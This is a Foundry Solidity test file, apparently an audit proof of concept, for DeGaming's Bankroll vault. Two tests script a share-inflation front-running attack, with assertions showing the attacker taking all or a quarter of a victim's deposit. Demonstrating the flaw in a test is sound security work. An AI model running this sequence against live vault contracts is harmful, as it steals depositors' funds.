// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

/* OpenZeppelin contract */
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {ProxyAdmin} from "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";

/* DeGaming Contracts */
import {Bankroll} from "src/Bankroll.sol";
import {DGBankrollManager} from "src/DGBankrollManager.sol";
import {DGBankrollFactory} from "src/DGBankrollFactory.sol";
import {DGEscrow} from "src/DGEscrow.sol";

/* DeGaming Libraries */
import {DGErrors} from "src/libraries/DGErrors.sol";

/* Mock Contracts */
import {MockToken} from "test/mock/MockToken.sol";

contract BKL_inflationAttack is Test {
    MockToken public mockToken;
    DGBankrollManager public dgBankrollManager;
    DGEscrow public dgEscrow;
    Bankroll public bankroll;
    DGBankrollFactory public dgBankrollFactory;
    TransparentUpgradeableProxy public bankrollProxy;

    ProxyAdmin public proxyAdmin;

    address admin;
    address deGaming;
    address operator;

    address[] operators;
    address[] lps;

    uint256 maxRisk = 10_000;
    uint256 threshold = 10_000;

    function setUp() public {
        admin = address(0x1);
        deGaming = address(0x2);
        operator = address(0x3);

        operators = [ 
            address(0x55), 
            address(0x56), 
            address(0x57),
            address(0x58),
            address(0x59),
            address(0x60)
        ];

        lps = [ 
            address(0x65), 
            address(0x66), 
            address(0x67),
            address(0x68),
            address(0x69),
            address(0x70)
        ];


        mockToken = new MockToken("Mock USDC", "mUSDC");

        dgBankrollFactory = new DGBankrollFactory();

        dgBankrollManager = new DGBankrollManager(deGaming);

        dgEscrow = new DGEscrow(1 weeks, address(dgBankrollManager));

        proxyAdmin = new ProxyAdmin();

        bankrollProxy = new TransparentUpgradeableProxy(
            address(new Bankroll()),
            address(proxyAdmin),
            abi.encodeWithSelector(
                Bankroll.initialize.selector,
                admin,
                address(mockToken),
                address(dgBankrollManager),
                address(dgEscrow),
                msg.sender,
                maxRisk,
                threshold
            )
        );

        bankroll = Bankroll(address(bankrollProxy));

        dgBankrollManager.grantRole(keccak256("ADMIN"), address(dgBankrollFactory));

        dgBankrollManager.grantRole(keccak256("ADMIN"), admin);

        vm.expectRevert(DGErrors.ADDRESS_NOT_A_CONTRACT.selector);
        dgBankrollManager.approveBankroll(admin, 650);
        
        dgBankrollManager.approveBankroll(address(bankroll), 650);

        dgBankrollManager.setOperatorToBankroll(address(bankroll), operator);

        mockToken.mint(admin, 1_000_000e6);

        vm.prank(admin);
    
        mockToken.approve(address(bankroll), 1_000_000e6);
    }

        function test_inflationAttack() public {
            uint256 VICTIME_BALANCE = 200e6;
            uint256 ATTACKER_DONATION = 1;
            uint256 ATTACKER_BALANCE = 200e6; 
            address bob = address(0x7);
            address alice = address(0x8);

            mockToken.mint(bob, ATTACKER_BALANCE + ATTACKER_DONATION);
            mockToken.mint(alice, VICTIME_BALANCE);
            assertEq(bankroll.liquidity(), 0);

            // Attacker back-runs creation of a bankroll and deposits 1 wei
            vm.startPrank(bob);
            mockToken.approve(address(bankroll), ATTACKER_DONATION);
            bankroll.depositFunds(ATTACKER_DONATION);
            assertEq(bankroll.sharesOf(address(bob)), ATTACKER_DONATION);
            vm.stopPrank();

            assertEq(bankroll.totalSupply(), 1);
            assertEq(bankroll.liquidity(), 1);

            // Attacker front-runs victim's deposit and transfers 200 USDC to contract
            vm.prank(bob);
            mockToken.transfer(address(bankroll), ATTACKER_BALANCE);

            // Victim deposits 200 USDC 
            vm.startPrank(alice);
            mockToken.approve(address(bankroll), VICTIME_BALANCE);
            bankroll.depositFunds(VICTIME_BALANCE);
            assertEq(bankroll.sharesOf(address(alice)), 0);
            vm.stopPrank();

            // Attacker burns their share and gets all the money
            vm.startPrank(bob);
            bankroll.withdrawalStageOne(bankroll.sharesOf(bob));
            vm.warp(3);
            bankroll.withdrawalStageTwo();
            vm.stopPrank();

            uint256 attackerBalanceAfter = mockToken.balanceOf(address(bob));
            assertEq(attackerBalanceAfter, ATTACKER_BALANCE + VICTIME_BALANCE + 1);
    }

        function test_inflationAttack2() public {
            uint256 VICTIME_BALANCE = 200e6;
            uint256 ATTACKER_DONATION = 1;
            uint256 ATTACKER_BALANCE = 100e6; 
            address bob = address(0x7);
            address alice = address(0x8);

            mockToken.mint(bob, ATTACKER_BALANCE + ATTACKER_DONATION);
            mockToken.mint(alice, VICTIME_BALANCE);
            assertEq(bankroll.liquidity(), 0);

            // Attacker back-runs creation of a bankroll and deposits 1 wei
            vm.startPrank(bob);
            mockToken.approve(address(bankroll), ATTACKER_DONATION);
            bankroll.depositFunds(ATTACKER_DONATION);
            assertEq(bankroll.sharesOf(address(bob)), ATTACKER_DONATION);
            vm.stopPrank();

            assertEq(bankroll.totalSupply(), 1);
            assertEq(bankroll.liquidity(), 1);

            // Attacker front-runs victim's deposit and transfers 100 USDC to contract
            vm.prank(bob);
            mockToken.transfer(address(bankroll), ATTACKER_BALANCE);

            // Victim deposits 200 USDC 
            vm.startPrank(alice);
            mockToken.approve(address(bankroll), VICTIME_BALANCE);
            bankroll.depositFunds(VICTIME_BALANCE);
            assertEq(bankroll.sharesOf(address(alice)), 1);
            vm.stopPrank();

            // Attacker burns their share and gets 25% of the victim's deposit
            vm.startPrank(bob);
            bankroll.withdrawalStageOne(bankroll.sharesOf(bob));
            vm.warp(3);
            bankroll.withdrawalStageTwo();
            vm.stopPrank();

            uint256 attackerBalanceAfter = mockToken.balanceOf(address(bob));
            assertEq(attackerBalanceAfter, ATTACKER_BALANCE + (VICTIME_BALANCE / 4));
    }
}